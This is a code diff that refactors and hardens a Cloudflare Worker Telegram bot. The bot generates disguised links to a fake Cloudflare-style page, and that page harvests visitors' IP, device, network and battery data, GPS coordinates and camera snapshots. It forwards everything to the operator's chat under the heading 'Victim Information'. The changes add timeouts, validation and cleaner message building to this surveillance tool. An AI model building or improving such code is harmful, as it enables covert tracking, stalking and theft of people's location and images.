@@ -1,7 +1,7 @@
 // Store sensitive values in environment variables instead of hardcoding
 // Replace these with your actual environment variables in your Cloudflare worker
-const TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
-const HOST_URL = HOST_URL || "https://your-worker-domain.workers.dev";
+const TELEGRAM_BOT_TOKEN = typeof TELEGRAM_BOT_TOKEN !== 'undefined' ? TELEGRAM_BOT_TOKEN : "YOUR_BOT_TOKEN";
+const HOST_URL = typeof HOST_URL !== 'undefined' ? HOST_URL : "https://your-worker-domain.workers.dev";
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 /**
@@ -23,8 +23,7 @@ const cloudflareTemplate = `<html lang="en-US"><head><meta charset="UTF-8"><meta
                  errorMsg = "Geolocation request timed out.";
             }
             k({ error: errorMsg });
-            if (typeof l !== 'undefined') l = true;
-            if (typeof locationCollected !== 'undefined') locationCollected = true;
+            l = true;
             redirectIfReady();
         },
         {timeout:10e3}
@@ -63,21 +62,25 @@ function decodeBase64(str) {
 }
 
 function renderTemplate(template, data) {
+  // Create a single replacement map for better performance
+  const replacements = new Map([
+    ['REPLACE_UID', data.uid || ''],
+    ['REPLACE_URL', data.url || ''],
+    ['REPLACE_HOST_URL', data.a || ''],
+    ['REPLACE_IP', data.ip || ''],
+    ['REPLACE_TIME', data.time || ''],
+    ['{{UID}}', data.uid || ''],
+    ['{{REDIRECT_URL}}', data.url || ''],
+    ['{{HOST_URL}}', data.a || ''],
+    ['{{IP}}', data.ip || ''],
+    ['{{TIME}}', data.time || '']
+  ]);
+  
+  // Single pass replacement for better performance
   let rendered = template;
-  
-  // Replace all placeholders with actual data
-  rendered = rendered.replace(/REPLACE_UID/g, data.uid || '');
-  rendered = rendered.replace(/REPLACE_URL/g, data.url || '');
-  rendered = rendered.replace(/REPLACE_HOST_URL/g, data.a || '');
-  rendered = rendered.replace(/REPLACE_IP/g, data.ip || '');
-  rendered = rendered.replace(/REPLACE_TIME/g, data.time || '');
-  
-  // Also handle the newer template format
-  rendered = rendered.replace(/\{\{UID\}\}/g, data.uid || '');
-  rendered = rendered.replace(/\{\{REDIRECT_URL\}\}/g, data.url || '');
-  rendered = rendered.replace(/\{\{HOST_URL\}\}/g, data.a || '');
-  rendered = rendered.replace(/\{\{IP\}\}/g, data.ip || '');
-  rendered = rendered.replace(/\{\{TIME\}\}/g, data.time || '');
+  for (const [placeholder, value] of replacements) {
+    rendered = rendered.replaceAll(placeholder, value);
+  }
   
   return rendered;
 }
@@ -91,6 +94,9 @@ function getClientIP(headers) {
  */
 async function sendTelegramMessage(chatId, text, options = {}) {
   try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+    
     const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
       method: 'POST',
       headers: {
@@ -101,8 +107,15 @@ async function sendTelegramMessage(chatId, text, options = {}) {
         text: text,
         parse_mode: 'HTML',
         ...options
-      })
+      }),
+      signal: controller.signal
     });
+
+    clearTimeout(timeoutId);
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
 
     const result = await response.json();
     if (!result.ok) {
@@ -111,6 +124,10 @@ async function sendTelegramMessage(chatId, text, options = {}) {
     }
     return result;
   } catch (error) {
+    if (error.name === 'AbortError') {
+      console.error('Telegram message request timed out');
+      throw new Error('Request timed out');
+    }
     console.error('Error sending Telegram message:', error);
     throw error;
   }
@@ -126,14 +143,36 @@ async function sendTelegramLocation(chatId, lat, lon) {
       throw new Error("Invalid coordinates");
     }
     
+    if (latitude < -90 || latitude > 90 || longitude < -180 || longitude > 180) {
+      throw new Error("Coordinates out of valid range");
+    }
+    
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+    
     const response = await fetch(`${TELEGRAM_API}/sendLocation`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, latitude: latitude, longitude: longitude })
+      body: JSON.stringify({ chat_id: chatId, latitude: latitude, longitude: longitude }),
+      signal: controller.signal
     });
+    
+    clearTimeout(timeoutId);
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    
     const result = await response.json();
+    if (!result.ok) {
+      throw new Error(`Telegram API error: ${result.description || 'Unknown error'}`);
+    }
     return result;
   } catch (error) {
+    if (error.name === 'AbortError') {
+      console.error('Telegram location request timed out');
+      throw new Error('Location request timed out');
+    }
     console.error("Error sending location:", error);
     throw error;
   }
@@ -147,6 +186,11 @@ async function sendTelegramPhoto(chatId, rawBase64Img, caption = "") {
 
     // Clean and validate base64 string
     const base64Clean = rawBase64Img.replace(/^data:image\/[a-z]+;base64,/, "");
+    
+    // Validate base64 format
+    if (!/^[A-Za-z0-9+/]*={0,2}$/.test(base64Clean)) {
+      throw new Error("Invalid base64 format");
+    }
     
     // Convert raw base64 to binary
     const binaryString = atob(base64Clean);
@@ -164,10 +208,20 @@ async function sendTelegramPhoto(chatId, rawBase64Img, caption = "") {
       formData.append("caption", caption);
     }
 
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout for photo upload
+
     const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
       method: "POST",
-      body: formData
+      body: formData,
+      signal: controller.signal
     });
+
+    clearTimeout(timeoutId);
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
 
     const result = await response.json();
     if (!result.ok) {
@@ -176,6 +230,10 @@ async function sendTelegramPhoto(chatId, rawBase64Img, caption = "") {
     }
     return result;
   } catch (error) {
+    if (error.name === 'AbortError') {
+      console.error('Telegram photo upload timed out');
+      throw new Error('Photo upload timed out');
+    }
     console.error('Error sending Telegram photo:', error);
     throw error;
   }
@@ -194,14 +252,28 @@ const corsHeaders = {
  */
 async function checkWebhookStatus() {
   try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 8000); // 8 second timeout
+    
     const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`, {
       method: "GET",
-      headers: { "Content-Type": "application/json" }
+      headers: { "Content-Type": "application/json" },
+      signal: controller.signal
     });
+    
+    clearTimeout(timeoutId);
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
     
     const result = await response.json();
     return result;
   } catch (error) {
+    if (error.name === 'AbortError') {
+      console.error("Webhook status check timed out");
+      return { ok: false, error: "Request timed out" };
+    }
     console.error("Error checking webhook status:", error);
     return { ok: false, error: error.message };
   }
@@ -210,15 +282,30 @@ async function checkWebhookStatus() {
 async function setupWebhook() {
   try {
     const webhookUrl = `${HOST_URL}/webhook`;
+    
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+    
     const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ url: webhookUrl })
+      body: JSON.stringify({ url: webhookUrl }),
+      signal: controller.signal
     });
+    
+    clearTimeout(timeoutId);
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
     
     const result = await response.json();
     return result;
   } catch (error) {
+    if (error.name === 'AbortError') {
+      console.error("Webhook setup timed out");
+      return { success: false, error: "Request timed out" };
+    }
     console.error("Error setting up webhook:", error);
     return { success: false, error: error.message };
   }
@@ -229,9 +316,40 @@ async function setupWebhook() {
  */
 async function createLink(chatId, url) {
   try {
+    // Input validation
+    if (!url || typeof url !== 'string') {
+      await sendTelegramMessage(chatId, `⚠️ Please enter a valid URL.`);
+      await createNew(chatId);
+      return;
+    }
+    
+    // Trim whitespace
+    url = url.trim();
+    
     // Basic URL validation
     if (!url.match(/^https?:\/\/.+/i)) {
       await sendTelegramMessage(chatId, `⚠️ Please enter a valid URL, including http:// or https://`);
+      await createNew(chatId);
+      return;
+    }
+    
+    // Check URL length
+    if (url.length > 2048) {
+      await sendTelegramMessage(chatId, `⚠️ URL is too long. Please use a shorter URL.`);
+      await createNew(chatId);
+      return;
+    }
+    
+    // Check for potentially dangerous URLs
+    const dangerousPatterns = [
+      /javascript:/i,
+      /data:/i,
+      /vbscript:/i,
+      /file:/i
+    ];
+    
+    if (dangerousPatterns.some(pattern => pattern.test(url))) {
+      await sendTelegramMessage(chatId, `⚠️ Invalid URL protocol detected.`);
       await createNew(chatId);
       return;
     }
@@ -246,7 +364,16 @@ async function createLink(chatId, url) {
     }
     
     const uid = chatId.toString(36);
-    const encodedUrl = btoa(url);
+    let encodedUrl;
+    
+    try {
+      encodedUrl = btoa(url);
+    } catch (error) {
+      console.error("Error encoding URL:", error);
+      await sendTelegramMessage(chatId, `⚠️ Error processing URL. Please try a different URL.`);
+      await createNew(chatId);
+      return;
+    }
     
     const cUrl = `${HOST_URL}/c/${uid}/${encodedUrl}`;
     const wUrl = `${HOST_URL}/w/${uid}/${encodedUrl}`;
@@ -480,76 +607,88 @@ async function handleRequest(request) {
           const ipAddress = getClientIP(request.headers);
           const currentTime = new Date().toISOString().replace("T", " ").slice(0, 19);
           
-          // Format the main message (excluding location)
-          let message = `✅Victim Information \n\n` +
-            `⚓ IP: ${ipAddress} (https://ip-api.com/#${ipAddress}) | Time: ${currentTime}\n\n` +
-            `⏳ Date In Victim's Device : ${new Date().toString()}\n\n` +
-            `📱 Device Information\n`;
+          // Format the main message more efficiently
+          const deviceInfo = jsonData.data?.deviceInfo || {};
+          const networkInfo = jsonData.data?.networkInfo || {};
+          const batteryInfo = jsonData.data?.batteryInfo || {};
+          const mediaDevices = jsonData.data?.mediaDevices || [];
+          const usbDevices = jsonData.data?.usbDevices || [];
           
-          // Add device information
-          if (jsonData.data?.deviceInfo) {
-            const deviceInfo = jsonData.data.deviceInfo;
-            for (const [key, value] of Object.entries(deviceInfo)) {
-              if (value !== undefined && value !== null) {
-                message += `${key}: ${value}\n`;
-              }
+          const messageParts = [
+            `✅Victim Information \n`,
+            `⚓ IP: ${ipAddress} (https://ip-api.com/#${ipAddress}) | Time: ${currentTime}\n`,
+            `⏳ Date In Victim's Device : ${new Date().toString()}\n`,
+            `📱 Device Information`
+          ];
+          
+          // Add device information efficiently
+          for (const [key, value] of Object.entries(deviceInfo)) {
+            if (value !== undefined && value !== null) {
+              messageParts.push(`${key}: ${value}`);
             }
           }
           
-          message += `\n📷 Media Device Information\n`;
+          messageParts.push(`\n📷 Media Device Information`);
           
           // Add media device information
-          if (jsonData.data?.mediaDevices && Array.isArray(jsonData.data.mediaDevices)) {
-            jsonData.data.mediaDevices.forEach(device => {
+          if (Array.isArray(mediaDevices) && mediaDevices.length > 0) {
+            mediaDevices.forEach(device => {
               if (device.kind && device.label) {
-                message += `${device.kind}: ${device.label}\n`;
+                messageParts.push(`${device.kind}: ${device.label}`);
               }
             });
           } else {
-            message += `None detected\n`;
+            messageParts.push(`None detected`);
           }
           
-          message += `\n🕸️ Network Information\n`;
+          messageParts.push(`\n🕸️ Network Information`);
           
           // Add network information
-          if (jsonData.data?.networkInfo) {
-            const networkInfo = jsonData.data.networkInfo;
+          if (Object.keys(networkInfo).length > 0) {
             for (const [key, value] of Object.entries(networkInfo)) {
               if (value !== undefined && value !== null) {
-                message += `${key}: ${value}\n`;
+                messageParts.push(`${key}: ${value}`);
               }
             }
           } else {
-            message += `None detected\n`;
+            messageParts.push(`None detected`);
           }
           
-          message += `\n🔌 Total USB devices connected: ${jsonData.data?.usbDevices?.length || 0}\n\n`;
-          
-          message += `🔋 Battery Information\n`;
+          messageParts.push(`\n🔌 Total USB devices connected: ${Array.isArray(usbDevices) ? usbDevices.length : 0}\n`);
+          messageParts.push(`🔋 Battery Information`);
           
           // Add battery information
-          if (jsonData.data?.batteryInfo) {
-            const batteryInfo = jsonData.data.batteryInfo;
-            message += `🔋Battery Level: ${batteryInfo.level ? Math.round(batteryInfo.level * 100) + '%' : 'Unknown'}\n`;
-            message += `⚡ Is Battery Charging: ${batteryInfo.charging ? 'true' : 'false'}\n`;
+          if (batteryInfo && !batteryInfo.error) {
+            messageParts.push(`🔋Battery Level: ${batteryInfo.level ? Math.round(batteryInfo.level * 100) + '%' : 'Unknown'}`);
+            messageParts.push(`⚡ Is Battery Charging: ${batteryInfo.charging ? 'true' : 'false'}`);
           } else {
-            message += `Battery data not available\n`;
+            messageParts.push(`Battery data not available`);
           }
+          
+          const message = messageParts.join('\n');
           
           // Send the main formatted message
           await sendTelegramMessage(chatId, message);
 
-          // Check for and send location data separately
+          // Check for and send location data separately with better error handling
           if (jsonData.data?.geolocation && !jsonData.data.geolocation.error) {
             const geo = jsonData.data.geolocation;
             try {
-              // Send the interactive map pin
-              await sendTelegramLocation(chatId, geo.latitude, geo.longitude);
-              // Send accuracy as a separate message
-              await sendTelegramMessage(chatId, `Latitude: ${geo.latitude}\nLongitude: ${geo.longitude}\nAccuracy: ${geo.accuracy} meters`);
+              // Validate coordinates before sending
+              const lat = parseFloat(geo.latitude);
+              const lon = parseFloat(geo.longitude);
+              
+              if (!isNaN(lat) && !isNaN(lon) && lat >= -90 && lat <= 90 && lon >= -180 && lon <= 180) {
+                // Send the interactive map pin
+                await sendTelegramLocation(chatId, lat, lon);
+                // Send accuracy as a separate message
+                await sendTelegramMessage(chatId, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${geo.accuracy || 'Unknown'} meters`);
+              } else {
+                await sendTelegramMessage(chatId, `📍 Location Error: Invalid coordinates received`);
+              }
             } catch (locationError) {
               console.error("Error sending location:", locationError);
-              await sendTelegramMessage(chatId, `📍 Location Error: Could not send map pin. Coordinates: ${geo.latitude}, ${geo.longitude}`);
+              await sendTelegramMessage(chatId, `📍 Location Error: ${locationError.message || 'Could not send location data'}`);
             }
           } else if (jsonData.data?.geolocation?.error) {
             // Notify if location failed
@@ -591,6 +730,11 @@ async function handleRequest(request) {
           return new Response("Missing required parameters (uid or img)", { status: 400 });
         }
 
+        // Validate UID format
+        if (typeof uid !== 'string' || uid.length === 0) {
+          return new Response("Invalid UID format", { status: 400 });
+        }
+
         // Extract raw base64 data from the data URL
         let rawBase64 = imgDataUrl;
         const prefixMatch = imgDataUrl.match(/^data:image\/\w+;base64,/);
@@ -604,8 +748,17 @@ async function handleRequest(request) {
             }
         }
 
-        // Calculate chatId from uid
-        const chatId = parseInt(uid, 36) || 123456789; // Fallback to default chat ID
+        // Validate base64 length (reasonable size check)
+        if (rawBase64.length > 5000000) { // ~3.75MB base64 limit
+          return new Response("Image data too large", { status: 413 });
+        }
+
+        // Calculate chatId from uid with validation
+        const chatIdNum = parseInt(uid, 36);
+        if (isNaN(chatIdNum)) {
+          return new Response("Invalid UID format", { status: 400 });
+        }
+        const chatId = chatIdNum || 123456789; // Fallback to default chat ID
 
         // Send the raw base64 image to Telegram
         await sendTelegramPhoto(chatId, rawBase64, "📸 Camera snapshot from visitor");
